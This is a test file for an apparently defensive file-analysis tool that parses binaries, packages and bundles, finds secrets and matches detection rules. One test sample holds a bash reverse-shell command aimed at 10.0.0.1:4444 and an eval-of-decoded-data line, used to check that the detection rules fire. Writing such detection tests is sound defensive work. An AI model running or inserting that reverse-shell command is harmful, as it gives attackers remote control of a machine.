// Real file tests. Every sample here is a real artifact from the wild (see samples/README.md).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, existsSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import {
  analyze, diff, verifyClaim, scanRules, STARTER_RULES, toSARIF, toMarkdown, toHTML, toCycloneDX,
  md5, sha1, sha256, detectFormat, ctph, ctphSimilarity, tlshLike, tlshDistance, ANALYZERS,
} from '../src/index.js';

const here = dirname(fileURLToPath(import.meta.url));
const SAMPLES = join(here, '..', '..', '..', 'samples');
const BIG = process.env.REVLENS_BIG_SAMPLES ?? join(SAMPLES, '.cache');
const load = (n: string) => new Uint8Array(readFileSync(join(SAMPLES, n)));
const big = (n: string) => join(BIG, n);
const enc = (s: string) => new TextEncoder().encode(s);

test('hashes match node:crypto on real files', () => {
  for (const name of ['ls-linux.elf', 'jquery.min.js', 'left-pad-1.3.0.tgz']) {
    const b = load(name);
    assert.equal(md5(b), createHash('md5').update(b).digest('hex'));
    assert.equal(sha1(b), createHash('sha1').update(b).digest('hex'));
    assert.equal(sha256(b), createHash('sha256').update(b).digest('hex'));
  }
  for (const n of [0, 1, 55, 56, 63, 64, 65, 1000]) {
    const b = new Uint8Array(n).map((_, i) => (i * 31) & 0xff);
    assert.equal(sha256(b), createHash('sha256').update(b).digest('hex'), `sha256 len ${n}`);
    assert.equal(md5(b), createHash('md5').update(b).digest('hex'), `md5 len ${n}`);
  }
});

test('detects formats by magic', () => {
  assert.equal(detectFormat(load('ls-linux.elf')), 'elf');
  assert.equal(detectFormat(load('jquery.min.js'), 'jquery.min.js'), 'js');
  assert.equal(detectFormat(load('jquery.min.map'), 'jquery.min.map'), 'sourcemap');
  assert.equal(detectFormat(load('left-pad-1.3.0.tgz'), 'left-pad-1.3.0.tgz'), 'npm-tgz');
  assert.equal(detectFormat(enc('{"a":1}'), 'x.json'), 'json');
  assert.equal(detectFormat(new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0])), 'wasm');
});

test('ELF: sections, needed libraries, dynamic symbols and hardening', async () => {
  const r = await analyze(load('ls-linux.elf'), { name: 'ls' });
  assert.equal(r.file.format, 'elf');
  assert.equal(r.file.bits, 64);
  assert.ok(r.sections.some((s) => s.name === '.text'), 'has .text');
  const needed = r.imports.find((i) => i.library === 'DT_NEEDED');
  assert.ok(needed?.symbols.some((s) => s.startsWith('libc.so')), 'links libc');
  assert.ok(r.imports.find((i) => i.library === 'dynamic symbols')?.symbols.includes('opendir'), 'imports opendir');
  assert.equal(r.hardening?.pie, true);
  assert.ok(r.capabilities.some((c) => c.name === 'enumerate files'));
});

test('JS bundle SBOM finds React DOM and jQuery with versions', async () => {
  const r = await analyze(load('react-dom.production.min.js'), { name: 'react-dom.production.min.js' });
  const rd = r.components.find((c) => c.name === 'react-dom');
  assert.equal(rd?.version, '18.3.1');
  assert.equal(rd?.purl, 'pkg:npm/react-dom@18.3.1');
  const j = await analyze(load('jquery.min.js'), { name: 'jquery.min.js' });
  assert.equal(j.components.find((c) => c.name === 'jquery')?.version, '3.7.1');
});

test('source map coverage is reported', async () => {
  const r = await analyze(load('jquery.min.map'), { name: 'jquery.min.map' });
  const sm = r.meta.sourcemap as { sources: number; coverage: number };
  assert.equal(sm.sources, 1);
  assert.equal(sm.coverage, 0);
  const inlineMap = { version: 3, sources: ['src/a.ts', 'src/b.ts'], sourcesContent: ['export const a = 1', null], mappings: 'AAAA' };
  const js = `console.log(1);\n//# sourceMappingURL=data:application/json;base64,${btoa(JSON.stringify(inlineMap))}`;
  const r2 = await analyze(enc(js), { name: 'app.js' });
  assert.equal((r2.meta.sourcemap as { coverage: number }).coverage, 50);
});

test('npm tarball: lists members, reads package.json, recurses', async () => {
  const r = await analyze(load('left-pad-1.3.0.tgz'), { name: 'left-pad-1.3.0.tgz' });
  assert.equal(r.file.format, 'npm-tgz');
  assert.ok((r.meta.memberCount as number) >= 5);
  assert.ok(r.components.some((c) => c.name === 'left-pad' && c.version === '1.3.0'));
  assert.ok((r.children ?? []).some((c) => c.file.name === 'package/index.js'));
});

test('secrets are found and redacted', async () => {
  // Built at run time so no real looking credential sits in the repo.
  const akid = 'AKIA' + 'Q3EGRTXYZ7ABCD12';
  const gh = 'ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8';
  const src = `const cfg = { key: "${akid}", token: "${gh}", password: "Zr8#qL!m2Vx9@pT4" };`;
  const r = await analyze(enc(src), { name: 'config.js' });
  const ids = r.findings.filter((f) => f.analyzer === 'secrets').map((f) => f.id.replace(/\.\d+$/, ''));
  assert.ok(ids.includes('secret.aws-akid'));
  assert.ok(ids.includes('secret.github-pat'));
  assert.ok(ids.includes('secret.generic-secret'));
  for (const f of r.findings) assert.ok(!JSON.stringify(f).includes(gh), 'token is never echoed in full');
});

test('obfuscation, reverse shells and eval of decoded data trigger rules', async () => {
  const src = 'var _0xab12=["x"];function _0xcd34(){};eval(atob("ZWNobyBoaQ=="));\nconst c = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";';
  const r = await analyze(enc(src), { name: 'evil.js' });
  const rules = r.meta.ruleMatches as string[];
  assert.ok(rules.includes('JS_Eval_Decoded'));
  assert.ok(rules.includes('Reverse_Shell_Strings'));
  assert.ok(r.findings.some((f) => f.id.startsWith('obfuscator.')));
});

test('yara-lite: text, hex with wildcards and jumps, regex, counts, offsets, uint', () => {
  const data = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, ...enc('hello WORLD hello'), 0xde, 0xad, 0x00, 0x00, 0xbe, 0xef]);
  const rules = String.raw`
    rule A { strings: $h = "hello" condition: #h == 2 and @h[1] == 4 }
    rule B { strings: $w = "world" nocase fullword condition: $w }
    rule C { strings: $x = { DE AD [1-3] BE ?? } condition: $x and uint16(0) == 0x5A4D }
    rule D { strings: $r = /hel+o\s+w/i condition: $r in (0..10) }
    rule E { strings: $a = "nope" $b = "hello" condition: 1 of ($a, $b) and not $a and filesize < 1KB }
    rule F { strings: $a = "nope" condition: $a }`;
  const hits = scanRules(data, rules).map((m) => m.rule);
  assert.deepEqual(hits, ['A', 'B', 'C', 'D', 'E']);
  assert.throws(() => scanRules(data, 'rule Bad { condition: $a === }'), /rule Bad/);
  assert.ok(scanRules(new Uint8Array(10), STARTER_RULES).length === 0, 'starter pack is quiet on empty data');
});

test('fuzzy hashes: similar inputs are closer than different ones', () => {
  const a = load('jquery.min.js');
  const b = a.slice(); b.set(enc('/* patched build */'), 2000);
  const c = load('react-dom.production.min.js');
  assert.ok(ctphSimilarity(ctph(a), ctph(b)) > ctphSimilarity(ctph(a), ctph(c)));
  assert.ok(tlshDistance(tlshLike(a), tlshLike(b)) <= tlshDistance(tlshLike(a), tlshLike(c)));
});

test('diff reports dependency and endpoint changes between versions', async () => {
  const v1 = await analyze(enc('/*! left-pad v1.2.0 */ fetch("https://api.example.dev/v1/users")'), { name: 'app-1.js' });
  const v2 = await analyze(enc('/*! left-pad v1.3.0 */ fetch("https://api.example.dev/v2/users"); fetch("https://telemetry.example.dev/collect")'), { name: 'app-2.js' });
  const d = diff(v1, v2);
  assert.equal(d.components.changed?.[0]?.after.version, '1.3.0');
  assert.ok(d.endpoints.added.includes('https://telemetry.example.dev/collect'));
  assert.ok(d.endpoints.removed.includes('https://api.example.dev/v1/users'));
  assert.match(d.summary, /dependency change/);
  assert.match(diff(v1, v1).summary, /identical/);
});

test('verifyClaim checks agent claims against bytes', async () => {
  const b = load('ls-linux.elf');
  const r = await analyze(b, { name: 'ls' });
  assert.equal(verifyClaim(b, { kind: 'format-is', format: 'elf' }).verdict, 'VERIFIED');
  assert.equal(verifyClaim(b, { kind: 'format-is', format: 'pe' }).verdict, 'REFUTED');
  assert.equal(verifyClaim(b, { kind: 'bytes-at', offset: 0, hex: '7f454c46' }).verdict, 'VERIFIED');
  assert.equal(verifyClaim(b, { kind: 'has-section', name: '.text' }, r).verdict, 'VERIFIED');
  assert.equal(verifyClaim(b, { kind: 'has-section', name: '.upx0' }, r).verdict, 'REFUTED');
  assert.equal(verifyClaim(b, { kind: 'imports-symbol', symbol: 'opendir' }, r).verdict, 'VERIFIED');
  assert.equal(verifyClaim(b, { kind: 'imports-symbol', symbol: 'CreateRemoteThread' }, r).verdict, 'REFUTED');
  assert.equal(verifyClaim(b, { kind: 'sha256-is', value: r.file.hashes.sha256 }).verdict, 'VERIFIED');
  assert.equal(verifyClaim(b, { kind: 'contains-string', value: 'GLIBC' }).verdict, 'VERIFIED');
});

test('outputs: SARIF 2.1.0, CycloneDX 1.5, Markdown and HTML', async () => {
  const r = await analyze(load('react-dom.production.min.js'), { name: 'react-dom.production.min.js' });
  const s = toSARIF(r) as { version: string; runs: { results: unknown[]; tool: { driver: { name: string } } }[] };
  assert.equal(s.version, '2.1.0');
  assert.equal(s.runs[0]?.tool.driver.name, 'RevLens');
  const bom = toCycloneDX(r) as { specVersion: string; components: { purl?: string }[] };
  assert.equal(bom.specVersion, '1.5');
  assert.ok(bom.components.some((c) => c.purl === 'pkg:npm/react-dom@18.3.1'));
  assert.match(toMarkdown(r), /# RevLens report: react-dom\.production\.min\.js/);
  const html = toHTML(r);
  assert.match(html, /^<!doctype html>/);
  assert.ok(!/<script/i.test(html), 'html report has no scripts');
});

test('every analyzer is registered with a description', () => {
  assert.ok(ANALYZERS.length >= 15);
  for (const a of ANALYZERS) assert.ok(a.id && a.title && a.description.length > 20, a.id);
});

test('never throws on random or truncated input', async () => {
  let seed = 7;
  const rnd = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) & 0xff;
  const headers = [[0x7f, 0x45, 0x4c, 0x46, 2, 1], [0x4d, 0x5a], [0xcf, 0xfa, 0xed, 0xfe], [0, 0x61, 0x73, 0x6d], [0x50, 0x4b, 3, 4], [0x1f, 0x8b], [0x43, 0x72, 0x32, 0x34, 3, 0, 0, 0]];
  for (const h of headers) for (const n of [8, 64, 600, 5000]) {
    const b = new Uint8Array(n).map(rnd); b.set(h.slice(0, n));
    const r = await analyze(b, { name: 'fuzz.bin' });
    assert.equal(r.schema, 'revlens/report@1');
  }
  const t = load('ls-linux.elf').subarray(0, 300);
  assert.equal((await analyze(t)).file.format, 'elf');
});

// Larger real binaries are downloaded by samples/fetch-samples.mjs in CI.
const bigTests: [string, (r: Awaited<ReturnType<typeof analyze>>) => void][] = [
  ['esbuild.exe', (r) => {
    assert.equal(r.file.format, 'pe'); assert.equal(r.file.arch, 'x86-64');
    assert.equal(r.hardening?.imphash, 'b196866f0bf37f1f128fa153413b744f', 'imphash matches pefile');
    assert.equal(r.meta.goVersion, 'go1.23.1');
  }],
  ['esbuild-macho', (r) => {
    assert.equal(r.file.format, 'macho'); assert.equal(r.file.arch, 'AArch64');
    assert.equal(r.hardening?.codeSignature, true);
    assert.ok(r.components.some((c) => c.name === 'golang.org/x/sys' && c.ecosystem === 'go'));
  }],
  ['esbuild.wasm', (r) => { assert.equal(r.file.format, 'wasm'); assert.ok(r.imports.some((i) => i.library === 'gojs')); }],
  ['ublock.xpi', (r) => {
    assert.equal(r.file.format, 'xpi');
    assert.ok(r.findings.some((f) => f.id === 'ext.hosts.all'));
    assert.ok(r.findings.some((f) => f.id === 'ext.mv2'));
  }],
  ['yaml.vsix', (r) => {
    assert.equal(r.file.format, 'vsix');
    assert.equal((r.meta.vscode as { publisher: string }).publisher, 'redhat');
    assert.ok(!r.findings.some((f) => f.severity === 'critical'), 'no false critical findings');
  }],
];
for (const [name, check] of bigTests) {
  test(`real binary: ${name}`, { skip: !existsSync(big(name)) && `run samples/fetch-samples.mjs to get ${name}` }, async () => {
    check(await analyze(new Uint8Array(readFileSync(big(name))), { name }));
  });
}
